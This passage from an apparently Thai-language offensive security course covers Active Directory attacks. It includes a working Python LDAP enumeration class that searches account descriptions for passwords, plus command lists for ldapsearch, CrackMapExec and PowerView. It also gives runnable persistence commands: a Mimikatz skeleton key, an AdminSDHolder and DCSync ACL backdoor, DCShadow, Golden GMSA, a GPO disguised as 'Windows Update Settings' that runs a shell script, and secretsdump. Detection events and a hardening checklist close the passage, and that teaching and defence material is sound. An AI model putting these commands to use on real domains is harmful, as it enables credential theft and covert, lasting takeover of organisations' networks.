from ldap3 import Server, Connection, ALL, NTLM, SUBTREE
from ldap3.core.exceptions import LDAPException
import json
from typing import Optional

class LDAPEnumerator:
    """
    LDAP enumeration สำหรับ Active Directory
    """
    
    def __init__(self, dc_ip: str, domain: str, 
                 username: str = None, password: str = None):
        self.dc_ip = dc_ip
        self.domain = domain
        self.base_dn = ",".join([f"DC={dc}" for dc in domain.split(".")])
        
        # สร้างการเชื่อมต่อ
        server = Server(dc_ip, get_info=ALL)
        
        if username and password:
            self.conn = Connection(
                server,
                user=f"{domain}\\{username}",
                password=password,
                authentication=NTLM
            )
        else:
            # Anonymous bind
            self.conn = Connection(server)
        
        self.conn.bind()
    
    def get_all_users(self) -> list:
        """ค้นหา users ทั้งหมด"""
        self.conn.search(
            search_base=self.base_dn,
            search_filter="(objectCategory=person)(objectClass=user)",
            search_scope=SUBTREE,
            attributes=[
                "sAMAccountName", "displayName", "mail",
                "memberOf", "lastLogon", "pwdLastSet",
                "userAccountControl", "servicePrincipalName",
                "adminCount", "description"
            ]
        )
        
        users = []
        for entry in self.conn.entries:
            uac = int(str(entry.userAccountControl)) if entry.userAccountControl else 0
            users.append({
                "username": str(entry.sAMAccountName),
                "display_name": str(entry.displayName),
                "email": str(entry.mail),
                "admin": bool(entry.adminCount and int(str(entry.adminCount)) > 0),
                "password_never_expires": bool(uac & 0x10000),
                "account_disabled": bool(uac & 0x2),
                "no_preauth_required": bool(uac & 0x400000),  # AS-REP roastable
                "has_spn": bool(entry.servicePrincipalName),
                "description": str(entry.description)
            })
        
        return users
    
    def get_high_privilege_users(self) -> list:
        """ค้นหา privileged users"""
        self.conn.search(
            search_base=self.base_dn,
            search_filter="(&(objectCategory=person)(objectClass=user)(adminCount=1))",
            search_scope=SUBTREE,
            attributes=["sAMAccountName", "memberOf", "lastLogon"]
        )
        
        return [
            {
                "username": str(entry.sAMAccountName),
                "groups": [str(g) for g in entry.memberOf]
            }
            for entry in self.conn.entries
        ]
    
    def get_domain_policy(self) -> dict:
        """ค้นหา domain password policy"""
        self.conn.search(
            search_base=self.base_dn,
            search_filter="(objectClass=domain)",
            search_scope=SUBTREE,
            attributes=[
                "minPwdLength", "pwdHistoryLength",
                "maxPwdAge", "lockoutThreshold",
                "lockoutDuration"
            ]
        )
        
        if self.conn.entries:
            entry = self.conn.entries[0]
            return {
                "min_password_length": str(entry.minPwdLength),
                "password_history": str(entry.pwdHistoryLength),
                "lockout_threshold": str(entry.lockoutThreshold),
                "lockout_duration": str(entry.lockoutDuration)
            }
        return {}
    
    def find_sensitive_descriptions(self) -> list:
        """ค้นหา passwords ใน description fields"""
        self.conn.search(
            search_base=self.base_dn,
            search_filter="(&(objectCategory=person)(description=*))",
            search_scope=SUBTREE,
            attributes=["sAMAccountName", "description"]
        )
        
        findings = []
        sensitive_keywords = ["password", "pass", "pwd", "cred", "temp"]
        
        for entry in self.conn.entries:
            desc = str(entry.description).lower()
            if any(kw in desc for kw in sensitive_keywords):
                findings.append({
                    "username": str(entry.sAMAccountName),
                    "description": str(entry.description)
                })
        
        return findings


LDAP_COMMANDS = """
# LDAP Enumeration Commands

# 1. ldapsearch - manual
ldapsearch -x -H ldap://DC_IP -b "DC=domain,DC=com" "(objectClass=person)"
ldapsearch -H ldap://DC_IP -x -b "" -s base  # rootDSE

# 2. ldapdomaindump
ldapdomaindump -u 'domain\\user' -p 'pass' ldap://DC_IP -o /tmp/dump

# 3. enum4linux
enum4linux -a DC_IP
enum4linux-ng -A DC_IP

# 4. PowerView LDAP queries
Get-DomainUser -Properties samaccountname,description,admincount
Get-DomainGroupMember -Identity "Domain Admins"
Get-DomainComputer -Properties name,operatingsystem,lastlogon
Get-DomainGPO -Properties displayname,gpcfilesyspath

# 5. หา LAPS passwords (ถ้าติดตั้ง)
Get-ADComputer -Filter * -Properties ms-Mcs-AdmPwd | Select-Object Name, 'ms-Mcs-AdmPwd'

# 6. หา passwords ใน AD description
Get-DomainUser -LDAPFilter "(description=*pass*)"

# 7. Dump with crackmapexec
crackmapexec ldap DC_IP -u user -p pass --users
crackmapexec ldap DC_IP -u user -p pass --groups
crackmapexec ldap DC_IP -u user -p pass --password-not-required
"""

print(LDAP_COMMANDS)
```

---

## Step 459: Active Directory Persistence

### แนวคิด
หลังจาก compromise AD แล้ว การ establish persistence ที่แข็งแกร่งช่วยให้เข้าถึงได้อีกครั้ง

```python
from typing import Optional

class ADPersistenceTechniques:
    """
    Active Directory Persistence Mechanisms
    """
    
    def skeleton_key_attack(self) -> str:
        """Skeleton Key - backdoor ใน LSASS"""
        return """
# Skeleton Key - inject master password ใน LSASS (ชั่วคราว - reboot แล้วหาย)
# ต้องเป็น Domain Admin

# Mimikatz
misc::skeleton

# หลังจากนั้น login ด้วย master password "mimikatz"
net use \\\\DC01\\C$ /user:domain\\ANY_ACCOUNT mimikatz

# ข้อเสีย: ไม่ persistent หลัง reboot
# ข้อดี: ไม่มีร่องรอยใน AD
"""
    
    def adminSDHolder_backdoor(self, domain: str, dc_ip: str, 
                                backdoor_user: str) -> str:
        """AdminSDHolder backdoor"""
        return f"""
# AdminSDHolder - ใส่ backdoor ใน AdminSDHolder object
# SDProp process จะ copy permissions ไปยัง protected objects ทุก 60 นาที

# เพิ่มสิทธิ์ให้ backdoor user บน AdminSDHolder
Add-ObjectACL -TargetDistinguishedName 'CN=AdminSDHolder,CN=System,DC=domain,DC=com' \
  -PrincipalSamAccountName {backdoor_user} \
  -Rights All

# รอ SDProp หรือ force รัน
Invoke-ADSDPropagation

# หลังจาก 60 นาที backdoor_user จะมีสิทธิ์บน Domain Admins ฯลฯ
"""
    
    def dcshadow_attack(self) -> str:
        """DCShadow - register fake DC"""
        return """
# DCShadow - ลงทะเบียน rogue DC เพื่อ replicate changes
# ต้องเป็น DA หรือมีสิทธิ์ DS-Install-Replica

# Terminal 1 (เริ่ม RPC listener)
mimikatz # lsadump::dcshadow /object:targetuser /attribute:SIDHistory /value:ADMIN_SID

# Terminal 2 (push changes)
mimikatz # sekurlsa::pth /user:admin /domain:DOMAIN /ntlm:HASH
mimikatz # lsadump::dcshadow /push

# DCShadow ล่องหนได้ดีกว่า DCSync เพราะ replication traffic ไม่ถูก monitor เท่า
"""
    
    def golden_gmsa_persistence(self) -> str:
        """Golden GMSA"""
        return """
# Group Managed Service Account (GMSA) Persistence
# ถ้าได้ KDS root key สามารถ compute GMSA password ได้ทุกเวลา

# ดึง KDS Root Key
Get-KdsRootKey
Invoke-Mimikatz -Command '"lsadump::mimi"'

# DSInternals สำหรับ compute GMSA password
Get-ADServiceAccount -Identity gmsa_account -Properties * | Select msDS-ManagedPasswordID
$account = Get-ADServiceAccount -Identity gmsa_account -Properties msDS-ManagedPasswordID
$key = Get-KdsRootKey
$password = Get-GMSAPassword -AccountId $account.SID -KdsRootKey $key
"""
    
    def create_malicious_gpo(self, dc_ip: str, domain: str) -> str:
        """Malicious GPO for persistence"""
        return f"""
# GPO Persistence - สร้าง GPO ที่รัน backdoor

# ใช้ PowerView
New-GPO -Name "Windows Update Settings"
New-GPLink -Name "Windows Update Settings" -Target "DC=domain,DC=com"

# เพิ่ม Scheduled Task ผ่าน GPO
Set-GPPrefRegistryValue -Name "Windows Update Settings" -Key "HKLM:\\..."

# หรือ impacket
python3 pygpoabuse.py {domain}/Admin:password@{dc_ip} \
  -gpo-id GPO_ID \
  -f /tmp/shell.ps1 \
  -taskname "WindowsUpdate"
"""
    
    def forge_security_descriptors(self) -> str:
        """ACL Backdoor"""
        return """
# ACL Backdoor - เพิ่มสิทธิ์ DCSync ให้ backdoor account

# PowerView
Add-ObjectACL -TargetIdentity 'DC=domain,DC=com' \
  -PrincipalIdentity backdoor_user \
  -Rights DCSync

# ตรวจสอบ
Get-ObjectACL 'DC=domain,DC=com' -ResolveGUIDs | 
  Where-Object {$_.IdentityReference -eq 'DOMAIN\\backdoor_user'}

# รันจาก compromised machine ทีหลัง
secretsdump.py domain/backdoor_user:password@DC_IP -just-dc
"""


AD_PERSISTENCE_DETECTION = """
# AD Persistence Detection

# 1. Monitor SDProp runs (Event 4780)
Get-WinEvent -FilterHashTable @{LogName='Security'; Id=4780}

# 2. Monitor AdminSDHolder changes (Event 4670)
Get-WinEvent -FilterHashTable @{LogName='Security'; Id=4670} | 
Where-Object {$_.Message -match 'AdminSDHolder'}

# 3. Monitor DCShadow (unusual replication)
# Event 4929 - AD replica removed
# Event 4928 - AD replica added

# 4. Monitor GPO changes (Event 5136)
Get-WinEvent -FilterHashTable @{LogName='Security'; Id=5136} |
Where-Object {$_.Message -match 'groupPolicyContainer'}

# 5. Purple Knight - free AD security assessment tool
# https://www.semperis.com/purple-knight/
"""

print(AD_PERSISTENCE_DETECTION)
```

---

## Step 460: Active Directory Defense and Hardening

### แนวคิด
การป้องกัน AD จาก attacks ต่างๆ ที่ครอบคลุม

```python
class ADHardeningGuide:
    """
    Active Directory Hardening Recommendations
    """
    
    HARDENING_CHECKLIST = {
        "Tier Model": [
            "Implement 3-tier model (Tier 0: DC/PKI, Tier 1: Servers, Tier 2: Workstations)",
            "Use Privileged Access Workstations (PAW) for Tier 0 administration",
            "Separate credentials for each tier",
            "Use jump servers for administration",
        ],
        "Account Security": [
            "Disable Guest and krbtgt account as little-used",
            "Reset krbtgt password every 180 days",
            "Add DA accounts to Protected Users group",
            "Enforce strong password policy (min 15 chars)",
            "Enable Account Lockout policy",
            "Audit all privileged group memberships",
            "Implement Just-In-Time (JIT) administration",
        ],
        "Kerberos Hardening": [
            "Disable RC4-HMAC encryption where possible",
            "Enable AES256 for all service accounts",
            "Remove SPNs from unnecessary accounts",
            "Monitor for Kerberoasting (Event 4769 with RC4)",
            "Enable Protected Users security group for admins",
        ],
        "Credential Theft Prevention": [
            "Enable Credential Guard (requires TPM 2.0)",
            "Enable LSA Protection (RunAsPPL)",
            "Disable WDigest authentication",
            "Enable Windows Defender Credential Guard",
            "Block NTLM in favor of Kerberos where possible",
        ],
        "ADCS Hardening": [
            "Require CA manager approval for sensitive templates",
            "Disable Subject Alternative Name in most templates",
            "Enable HTTPS for CA web enrollment",
            "Audit all certificate issuances",
            "Run Certipy/Certify to find vulnerable templates",
        ],
        "Monitoring": [
            "Enable Advanced Audit Policy",
            "Forward logs to SIEM",
            "Monitor for Golden/Silver Ticket attacks",
            "Alert on DCSync activity (Event 4662)",
            "Deploy Microsoft Defender for Identity (MDI)",
            "Run Purple Knight quarterly",
        ]
    }
    
    def generate_checklist(self) -> str:
        checklist = []
        checklist.append("=" * 70)
        checklist.append("ACTIVE DIRECTORY HARDENING CHECKLIST")
        checklist.append("=" * 70)
        
        total = 0
        for category, items in self.HARDENING_CHECKLIST.items():
            checklist.append(f"\n## {category}")
            for item in items:
                checklist.append(f"  [ ] {item}")
                total += 1
        
        checklist.append(f"\nTotal controls: {total}")
        return "\n".join(checklist)
    
    def generate_powershell_hardening_script(self) -> str:
        return """
# AD Hardening PowerShell Script

# 1. Enable Protected Users group for admins
Get-ADGroupMember "Domain Admins" | 
  ForEach-Object { Add-ADGroupMember -Identity "Protected Users" -Members $_ }

# 2. Disable RC4 for accounts with SPN
Get-ADUser -Filter {ServicePrincipalName -ne "$null"} | 
  Set-ADAccountControl -KerberosEncryptionType AES256

# 3. Enable Audit Policies
auditpol /set /subcategory:"Credential Validation" /success:enable /failure:enable
auditpol /set /subcategory:"Kerberos Authentication Service" /success:enable /failure:enable
auditpol /set /subcategory:"Directory Service Access" /success:enable /failure:enable

# 4. Disable WDigest
Set-ItemProperty -Path "HKLM:\\System\\CurrentControlSet\\Control\\SecurityProviders\\WDigest" \
  -Name UseLogonCredential -Value 0

# 5. Enable LSA Protection
Set-ItemProperty -Path "HKLM:\\SYSTEM\\CurrentControlSet\\Control\\Lsa" \
  -Name RunAsPPL -Value 1

# 6. Force Kerberos (block NTLM)
Set-ItemProperty -Path "HKLM:\\System\\CurrentControlSet\\Control\\Lsa\\MSV1_0" \
  -Name RestrictReceivingNTLMTraffic -Value 2

# 7. Enforce minimum password length
Set-ADDefaultDomainPasswordPolicy -Identity domain.com -MinPasswordLength 14
"""


if __name__ == "__main__":
    guide = ADHardeningGuide()
    print(guide.generate_checklist())
    print(guide.generate_powershell_hardening_script())
```

---

## สรุป Part 46

ในส่วนนี้ได้เรียนรู้:

1. **Kerberoasting** - เทคนิค crack TGS tickets
2. **Golden/Silver Ticket** - การ forge Kerberos tickets
3. **DCSync** - ดึง password hashes จาก DC
4. **Pass-the-Hash/Ticket** - ใช้ credentials จาก memory
5. **ADCS Attacks** - ESC1, ESC4, ESC8 exploitation
6. **BloodHound** - วิเคราะห์ attack paths
7. **Domain Trust Attacks** - cross-domain escalation
8. **LDAP Enumeration** - ดึงข้อมูล AD ผ่าน LDAP
9. **AD Persistence** - Skeleton Key, AdminSDHolder, DCShadow
10. **AD Hardening** - การป้องกันและ monitoring

### เครื่องมือสำคัญ
- `Impacket` - GetUserSPNs, secretsdump, psexec
- `Rubeus` - Kerberos ticket manipulation
- `Mimikatz` - credential extraction
- `BloodHound/SharpHound` - AD attack path analysis
- `Certipy` - ADCS vulnerability scanning
- `CrackMapExec` - AD enumeration and exploitation
- `PowerView` - AD reconnaissance PowerShell
